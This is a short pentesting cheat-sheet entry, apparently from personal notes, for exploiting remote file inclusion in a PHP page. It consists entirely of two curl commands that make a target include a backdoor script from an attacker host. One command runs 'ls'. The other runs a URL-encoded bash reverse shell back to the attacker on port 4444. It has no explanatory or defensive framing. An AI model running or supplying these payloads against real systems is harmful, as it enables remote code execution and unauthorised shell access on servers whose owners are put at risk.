## RFI ##
```
curl http://192.168.0.0/index.php?page=http://ATTACKERIP/simple-backdoor.php&cmd=ls"  #Dloads rvrse shell from attacker and executes ls command
curl http://192.168.0.0/index.php?page=http://ATTACKERIP/simple-backdoor.php&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKERIP%2F4444%200%3E%261%22"  #excute rvrse shell back to attacker machine
```
